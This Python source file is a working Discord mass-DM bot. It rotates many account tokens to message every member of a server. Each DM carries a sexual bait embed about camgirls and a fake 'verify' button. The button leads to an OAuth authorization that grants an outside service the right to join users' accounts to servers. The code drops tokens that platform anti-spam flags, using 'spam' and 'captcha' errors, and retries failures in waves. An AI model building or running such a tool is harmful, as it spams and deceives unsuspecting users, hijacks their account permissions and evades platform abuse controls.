# mass_dm_bot_verify_button.py
# WARNING: Replace placeholder tokens with your real tokens locally.
# Mass-DMing large numbers of users may violate Discord TOS. Use responsibly.
#
# ========================================================================
# HOW TO ADJUST SPEED AND DELAYS:
# ========================================================================
# 1. STATUS_UPDATE_INTERVAL: How often the status message updates
#    - Look for "STATUS_UPDATE_INTERVAL" in the DELAY CONFIGURATION section
#    - Default: 5.0 seconds
#    - Lower = more frequent updates but may hit rate limits
#    - Higher = less frequent updates but more efficient
#
# 2. DM_DELAY: Delay between each DM attempt
#    - Look for "DM_DELAY" in the DELAY CONFIGURATION section
#    - Default: 0.05 seconds (50ms)
#    - Lower = faster DM sending but higher risk of rate limits
#    - Higher = slower but safer
#    - Recommended range: 0.01 to 0.1 seconds
#
# 3. MAX_CONCURRENT_DMS: Maximum concurrent DMs at once (PRIMARY SPEED CONTROL)
#    - Look for "MAX_CONCURRENT_DMS" in the DELAY CONFIGURATION section
#    - Default: 10 (conservative for safety)
#    - Higher = faster but more likely to trigger rate limits
#    - Lower = slower but safer
#    - Recommended range: 10 to 100 (upper limit depends on number of sender tokens)
#    - Rule of thumb: Set to (number of sender tokens × 5) for optimal speed
#      Note: "sender tokens" = tokens in TOKENS list excluding the controller (first token)
#      e.g., with 11 total tokens (1 controller + 10 senders), can use 50 concurrent
#      e.g., with 21 total tokens (1 controller + 20 senders), can use 100 concurrent
# ========================================================================


import time
import asyncio
from discord.ext import commands
import discord
from discord.ui import Button, View

# --- Intents ---
intents = discord.Intents.default()
intents.members = True
intents.message_content = True

# --- Bot (controller) ---
bot = commands.Bot(command_prefix="!", intents=intents)

# --- Tokens (replace locally) ---
TOKENS = [
    "",
    "",
    "",

    # Add more sender tokens if needed
]

# --- DELAY CONFIGURATION (edit these values to adjust speed) ---
# How often to update the status message (in seconds)
STATUS_UPDATE_INTERVAL = 5.0

# --- Globals ---
sender_clients = []
sender_tasks = []
sender_meta = {}
dm_active = False

# --- Utility function ---
def user_label_from_user_obj(user):
    if user is None:
        return "unknown"
    name = getattr(user, "name", None)
    disc = getattr(user, "discriminator", None)
    uid = getattr(user, "id", None)
    if name is None:
        return f"unknown ({uid})"
    if disc is not None and disc != "":
        return f"{name}#{disc}"
    return f"{name} ({uid})"

# --- Button view ---
class VerifyButton(View):
    def __init__(self):
        super().__init__(timeout=None)
        self.add_item(Button(
            label="Join camshow server",
            style=discord.ButtonStyle.link,
            url="https://discord.com/oauth2/authorize?client_id=1467682706430234706&redirect_uri=https%3A%2F%2Frestorecord.com%2Fapi%2Fcallback&response_type=code&scope=identify+guilds.join&state=1469518705712038105&prompt=none"
        ))

# --- Bot ready ---
@bot.event
async def on_ready():
    print(f'Controller logged in as {bot.user} ({bot.user.id})')

# --- Supervise sender clients ---
async def _supervise_sender(token: str, token_index: int, max_restarts: int = 3):
    client = discord.Client(intents=intents)
    sender_clients.append(client)
    sender_meta[client] = {
        "token_index": token_index,
        "token": token,
        "dead": False,
        "restarts": 0,
        "started_once": False,
    }
    meta = sender_meta[client]

    @client.event
    async def _on_ready(c=client):
        try:
            label = user_label_from_user_obj(getattr(c, "user", None))
            print(f"[sender #{token_index}] logged in as {label}")
        except Exception:
            print(f"[sender #{token_index}] logged in (label unavailable)")
        meta["started_once"] = True

    while not meta["dead"] and meta["restarts"] <= max_restarts:
        try:
            await client.start(token, reconnect=False)
            break
        except discord.LoginFailure:
            meta["dead"] = True
            print(f"[sender #{token_index}] token invalid/revoked. Marking dead.")
            break
        except discord.HTTPException as e:
            status = getattr(e, "status", None)
            if status == 401 or "unauthorized" in str(e).lower():
                meta["dead"] = True
                print(f"[sender #{token_index}] HTTP 401/Unauthorized. Marking dead.")
                break
            meta["restarts"] += 1
            if meta["restarts"] > max_restarts:
                print(f"[sender #{token_index}] Max restarts reached. Stopping retries.")
                break
            backoff = min(60, 2 ** meta["restarts"])
            print(f"[sender #{token_index}] HTTPException: {e}. Restarting after {backoff}s.")
            await asyncio.sleep(backoff)
            continue
        except Exception as e:
            meta["restarts"] += 1
            if meta["restarts"] > max_restarts:
                print(f"[sender #{token_index}] Unexpected error, max restarts reached: {e}")
                break
            backoff = min(60, 2 ** meta["restarts"])
            print(f"[sender #{token_index}] Unexpected error: {e}. Restarting after {backoff}s.")
            await asyncio.sleep(backoff)
            continue

    try:
        if not getattr(client, "is_closed", lambda: True)():
            await client.close()
    except Exception:
        pass

    if meta["dead"]:
        print(f"[sender #{token_index}] token dead; supervisor ending.")
    else:
        print(f"[sender #{token_index}] supervision ended.")

async def start_all_senders_supervised(sender_tokens):
    for i, tok in enumerate(sender_tokens, start=1):
        task = asyncio.create_task(_supervise_sender(tok, token_index=i))
        sender_tasks.append(task)
        await asyncio.sleep(0.15)

# --- Mass DM command ---
@bot.command()
@commands.has_permissions(administrator=True)
async def mdm(ctx, *, message: str):
    global dm_active
    if dm_active:
        await ctx.send("A mass DM operation is already in progress.")
        return

    dm_active = True
    try:
        await ctx.message.delete()
    except Exception:
        pass

    # Shared state for tracking progress
    sent_count = 0
    failed_count = 0
    failed_members = []  # Track members who failed to receive DM
    current_member_info = {"name": "N/A", "id": "N/A", "status": "Pending"}
    start_time = time.time()
    controller_label = user_label_from_user_obj(getattr(bot, "user", None))
    
    # Thread-safe counters using asyncio.Lock
    stats_lock = asyncio.Lock()

    status_message = await ctx.send(
        f"**Mass DM Operation Started**\n"
        f"Message: {message}\n"
        f"Total Members: {len(ctx.guild.members)}\n"
        f"Time Started: {time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(start_time))}\n"
        f"----------------------------------------\n"
        f"DMing: N/A\n"
        f"Status: Pending\n"
        f"People DMed: {sent_count}\n"
        f"People Failed to DM: {failed_count}\n"
        f"Time Elapsed: 0 seconds"
    )

    # Status update task - runs every STATUS_UPDATE_INTERVAL seconds
    async def update_status():
        while dm_active:
            await asyncio.sleep(STATUS_UPDATE_INTERVAL)
            if not dm_active:
                break
            
            elapsed_time = int(time.time() - start_time)
            async with stats_lock:
                current_sent = sent_count
                current_failed = failed_count
                current_info = current_member_info.copy()
            
            try:
                await status_message.edit(content=(
                    f"**Mass DM Operation In Progress**\n"
                    f"Message: {message}\n"
                    f"Total Members: {len(ctx.guild.members)}\n"
                    f"Time Started: {time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(start_time))}\n"
                    f"----------------------------------------\n"
                    f"Last DMed: {current_info['name']} ({current_info['id']})\n"
                    f"Status: {current_info['status']}\n"
                    f"People DMed: {current_sent}\n"
                    f"People Failed to DM: {current_failed}\n"
                    f"Time Elapsed: {elapsed_time} seconds"
                ))
            except Exception:
                pass

    # Start the status update task
    status_task = asyncio.create_task(update_status())

    if sender_clients:
        for _ in range(20):
            if all(getattr(c, "is_ready", lambda: False)() or sender_meta.get(c, {}).get("dead", False) for c in sender_clients):
                break
            await asyncio.sleep(1)

    # Prepare available senders
    available_senders = [
        s for s in sender_clients
        if getattr(s, "is_ready", lambda: False)() and s.get_guild(ctx.guild.id) is not None and not sender_meta.get(s, {}).get("dead", False)
    ]
    total_senders = len(available_senders)
    client_index = 0
    sender_lock = asyncio.Lock()

    # Function to get next available sender (fast, minimal locking)
    def get_next_sender():
        nonlocal client_index, available_senders, total_senders
        if total_senders == 0 or not available_senders:
            return None, None
        
        # Simple round-robin without checks (checks done during DM send)
        sender = available_senders[client_index % total_senders]
        client_index += 1
        label = user_label_from_user_obj(getattr(sender, "user", None))
        return sender, label

    # Function to send a single DM
    async def send_dm_to_member(member, log_file, wave_name="Initial"):
        nonlocal sent_count, failed_count, available_senders, total_senders
        
        if not dm_active:
            return False
        
        # Get a sender client quickly (minimal lock time)
        used_sender = None
        used_label = controller_label
        
        # Fast bot selection with minimal locking
        async with sender_lock:
            used_sender, used_label = get_next_sender()
        
        # If bot was marked dead or invalid, try to get another one
        if used_sender and (sender_meta.get(used_sender, {}).get("dead", False) or 
                           not getattr(used_sender, "is_ready", lambda: False)() or
                           used_sender.get_guild(ctx.guild.id) is None):
            async with sender_lock:
                try:
                    available_senders.remove(used_sender)
                    total_senders = len(available_senders)
                except (ValueError, AttributeError):
                    pass
                used_sender, used_label = get_next_sender()

        log_message = f"[{wave_name}] {used_label}  Attempting to DM {member} ({member.id})... "
        print(log_message, end="")
        log_file.write(log_message)

        success = False
        try:
            # Embed with Verify Now button
            embed = discord.Embed(
                title="THEY HAVING LESBIAN ESEX ON CAM",
                description="verify below to never miss a stage from gio and 24/7 camgirls.\n if u dont verify u might never see a stage agein 👀.",
                color=0
            )
                            
            embed.set_image(url="https://media.discordapp.net/attachments/1469864352197771382/1472489934509310097/image.png?ex=6992c29d&is=6991711d&hm=17597fe1dbca4ae34347d842d6390a377fa310f4fe27812b890abf25ce950912&=&format=webp&quality=lossless")

            view = VerifyButton()

            if used_sender is not None:
                # Create User object directly without fetching (avoids rate-limited API call)
                user = discord.Object(id=member.id)
                channel = await used_sender.create_dm(user)
                await channel.send(content=None, embed=embed, view=view)
            else:
                await member.send(content=None, embed=embed, view=view)

            async with stats_lock:
                sent_count += 1
            success = True
            print("Success!")
            log_file.write("Success!\n")

        except Exception as e:
            async with stats_lock:
                failed_count += 1
            error_message = f"Failed: {e}"
            print(error_message)
            log_file.write(error_message + "\n")

            try:
                msg = str(e).lower()
                # Check if error is related to spam/token being flagged
                if used_sender is not None and ("401" in msg or "unauthorized" in msg or "spam" in msg or "captcha" in msg or isinstance(e, discord.LoginFailure)):
                    print(f"\n[WARNING] Sender {used_label} has been flagged/disabled. Marking as dead.")
                    log_file.write(f"[WARNING] Sender {used_label} has been flagged/disabled. Marking as dead.\n")
                    sender_meta[used_sender]["dead"] = True
                    async with sender_lock:
                        try:
                            available_senders.remove(used_sender)
                        except ValueError:
                            pass
                        total_senders = len(available_senders)
            except Exception:
                pass
        
        # Update current member info
        async with stats_lock:
            current_member_info["name"] = str(member)
            current_member_info["id"] = str(member.id)
            current_member_info["status"] = "Success" if success else "Failed"
        
        return success

    # Open log file for the entire operation
    with open("massdm.txt", "a", encoding="utf-8") as log_file:
        log_file.write(f"\nMass DM started by {ctx.author} in {ctx.guild.name} ({ctx.guild.id})\n")
        log_file.write(f"Message: {message}\n\n")

        # Initial wave: Create DM tasks for all members
        log_file.write("=== INITIAL WAVE ===\n")
        print("\n=== INITIAL WAVE ===")
        dm_tasks = []
        member_task_map = {}  # Track which task corresponds to which member
        
        for member in ctx.guild.members:
            if member.bot or member == bot.user:
                continue
            
            # Create a task for concurrent DM sending
            async def send_dm_task(member_to_dm=member, file_handle=log_file):
                success = await send_dm_to_member(member_to_dm, file_handle, "Initial Wave")
                if not success:
                    async with stats_lock:
                        failed_members.append(member_to_dm)
                return success
            
            task = asyncio.create_task(send_dm_task())
            dm_tasks.append(task)
            member_task_map[task] = member

        # Wait for all initial DMs to complete
        results = await asyncio.gather(*dm_tasks, return_exceptions=True)
        
        # Log any unhandled exceptions
        for i, result in enumerate(results):
            if isinstance(result, Exception):
                print(f"Unhandled exception in DM task {i}: {result}")
                log_file.write(f"Unhandled exception in DM task {i}: {result}\n")
        
        # Get count of initially failed members
        async with stats_lock:
            initial_failed_count = len(failed_members)
        
        print(f"\n=== INITIAL WAVE COMPLETE ===")
        print(f"Successfully DMed: {sent_count}")
        print(f"Failed: {initial_failed_count}")
        log_file.write(f"\n=== INITIAL WAVE COMPLETE ===\n")
        log_file.write(f"Successfully DMed: {sent_count}\n")
        log_file.write(f"Failed: {initial_failed_count}\n\n")
        
        # RETRY WAVE 1: Retry failed members with working bots
        if initial_failed_count > 0:
            print(f"\n=== RETRY WAVE 1 ===")
            log_file.write("=== RETRY WAVE 1 ===\n")
            log_file.write(f"Retrying {initial_failed_count} failed members...\n")
            
            # Update status message
            try:
                elapsed_time = int(time.time() - start_time)
                await status_message.edit(content=(
                    f"**Mass DM Operation - Retry Wave 1**\n"
                    f"Message: {message}\n"
                    f"Total Members: {len(ctx.guild.members)}\n"
                    f"Time Started: {time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(start_time))}\n"
                    f"----------------------------------------\n"
                    f"People DMed: {sent_count}\n"
                    f"Retrying: {initial_failed_count} members\n"
                    f"Time Elapsed: {elapsed_time} seconds"
                ))
            except Exception:
                pass
            
            # Create copy of failed members for retry
            async with stats_lock:
                retry_members_1 = failed_members.copy()
                failed_members.clear()
            
            # Retry failed members
            retry_tasks_1 = []
            for member in retry_members_1:
                async def retry_send_task_1(member_to_dm=member, file_handle=log_file):
                    success = await send_dm_to_member(member_to_dm, file_handle, "Retry Wave 1")
                    if not success:
                        async with stats_lock:
                            failed_members.append(member_to_dm)
                    return success
                
                task = asyncio.create_task(retry_send_task_1())
                retry_tasks_1.append(task)
            
            # Wait for retry wave 1 to complete
            retry_results_1 = await asyncio.gather(*retry_tasks_1, return_exceptions=True)
            
            async with stats_lock:
                retry_1_failed_count = len(failed_members)
            
            print(f"\n=== RETRY WAVE 1 COMPLETE ===")
            print(f"Successfully DMed in retry: {initial_failed_count - retry_1_failed_count}")
            print(f"Still failed: {retry_1_failed_count}")
            log_file.write(f"\n=== RETRY WAVE 1 COMPLETE ===\n")
            log_file.write(f"Successfully DMed in retry: {initial_failed_count - retry_1_failed_count}\n")
            log_file.write(f"Still failed: {retry_1_failed_count}\n\n")
            
            # RETRY WAVE 2: Second retry for still-failed members
            if retry_1_failed_count > 0:
                print(f"\n=== RETRY WAVE 2 ===")
                log_file.write("=== RETRY WAVE 2 ===\n")
                log_file.write(f"Retrying {retry_1_failed_count} still-failed members...\n")
                
                # Update status message
                try:
                    elapsed_time = int(time.time() - start_time)
                    await status_message.edit(content=(
                        f"**Mass DM Operation - Retry Wave 2**\n"
                        f"Message: {message}\n"
                        f"Total Members: {len(ctx.guild.members)}\n"
                        f"Time Started: {time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(start_time))}\n"
                        f"----------------------------------------\n"
                        f"People DMed: {sent_count}\n"
                        f"Retrying: {retry_1_failed_count} members\n"
                        f"Time Elapsed: {elapsed_time} seconds"
                    ))
                except Exception:
                    pass
                
                # Create copy of still-failed members for second retry
                async with stats_lock:
                    retry_members_2 = failed_members.copy()
                    failed_members.clear()
                
                # Retry failed members again
                retry_tasks_2 = []
                for member in retry_members_2:
                    async def retry_send_task_2(member_to_dm=member, file_handle=log_file):
                        success = await send_dm_to_member(member_to_dm, file_handle, "Retry Wave 2")
                        if not success:
                            async with stats_lock:
                                failed_members.append(member_to_dm)
                        return success
                    
                    task = asyncio.create_task(retry_send_task_2())
                    retry_tasks_2.append(task)
                
                # Wait for retry wave 2 to complete
                retry_results_2 = await asyncio.gather(*retry_tasks_2, return_exceptions=True)
                
                async with stats_lock:
                    final_failed_count = len(failed_members)
                
                print(f"\n=== RETRY WAVE 2 COMPLETE ===")
                print(f"Successfully DMed in retry: {retry_1_failed_count - final_failed_count}")
                print(f"Permanently failed: {final_failed_count}")
                log_file.write(f"\n=== RETRY WAVE 2 COMPLETE ===\n")
                log_file.write(f"Successfully DMed in retry: {retry_1_failed_count - final_failed_count}\n")
                log_file.write(f"Permanently failed: {final_failed_count}\n\n")
        
        # Log permanently failed members
        async with stats_lock:
            if failed_members:
                log_file.write("\n=== PERMANENTLY FAILED MEMBERS ===\n")
                print("\n=== PERMANENTLY FAILED MEMBERS ===")
                for member in failed_members:
                    failed_msg = f"  - {member} ({member.id})\n"
                    log_file.write(failed_msg)
                    print(failed_msg, end="")

    # Stop the status update task
    dm_active = False
    status_task.cancel()
    try:
        await status_task
    except asyncio.CancelledError:
        pass

    # Final status update
    elapsed_time = int(time.time() - start_time)
    
    # Get final failed count
    async with stats_lock:
        final_permanently_failed = len(failed_members)
    
    final_status = (
        f"**Mass DM Operation Completed**\n"
        f"Message: {message}\n"
        f"Total Members: {len(ctx.guild.members)}\n"
        f"Time Started: {time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(start_time))}\n"
        f"Time Completed: {time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(time.time()))}\n"
        f"----------------------------------------\n"
        f"People Successfully DMed: {sent_count}\n"
        f"People Permanently Failed: {final_permanently_failed}\n"
        f"Total Time: {elapsed_time} seconds"
    )
    
    try:
        await status_message.edit(content=final_status)
    except Exception:
        pass

    # Send detailed DM to author
    result_message = (
        f'**Mass DM Operation Complete**\n'
        f'Successfully sent to: {sent_count} members\n'
        f'Permanently failed: {final_permanently_failed} members\n\n'
    )
    
    if final_permanently_failed > 0:
        result_message += "**Permanently Failed Members:**\n"
        async with stats_lock:
            for member in failed_members[:20]:  # Limit to first 20 to avoid message length issues
                result_message += f"  - {member} ({member.id})\n"
            if final_permanently_failed > 20:
                result_message += f"  ... and {final_permanently_failed - 20} more (see massdm.txt for full list)\n"
    
    try:
        await ctx.author.send(result_message)
    except Exception:
        pass

# --- Command error handlers ---
@mdm.error
async def mdm_error(ctx, error):
    if isinstance(error, commands.MissingPermissions):
        await ctx.send("You need Administrator permissions to use this command.", delete_after=5)
    elif isinstance(error, commands.MissingRequiredArgument):
        await ctx.send("Usage: `!mdm <message>`", delete_after=5)
    else:
        await ctx.send(f"An error occurred: {error}", delete_after=5)

@bot.command()
@commands.has_permissions(administrator=True)
async def mdme(ctx):
    global dm_active
    if not dm_active:
        await ctx.send("No mass DM operation is currently in progress.")
        return
    dm_active = False
    await ctx.send("The mass DM operation has been halted.")

@mdme.error
async def mdme_error(ctx, error):
    if isinstance(error, commands.MissingPermissions):
        await ctx.send("You need Administrator permissions to use this command.")

# --- Main entrypoint ---
async def main():
    controller_token = TOKENS[0] if TOKENS else None
    sender_tokens = TOKENS[1:] if len(TOKENS) > 1 else []

    if sender_tokens:
        await start_all_senders_supervised(sender_tokens)
    if sender_tasks:
        await asyncio.sleep(3)

    try:
        if controller_token:
            await bot.start(controller_token)
        else:
            print("No controller token provided.")
    finally:
        for c in list(sender_clients):
            try:
                if sender_meta.get(c):
                    sender_meta[c]["dead"] = True
                await c.close()
            except Exception:
                pass
        for t in sender_tasks:
            if not t.done():
                t.cancel()
        await asyncio.sleep(0.1)

if __name__ == "__main__":
    asyncio.run(main())
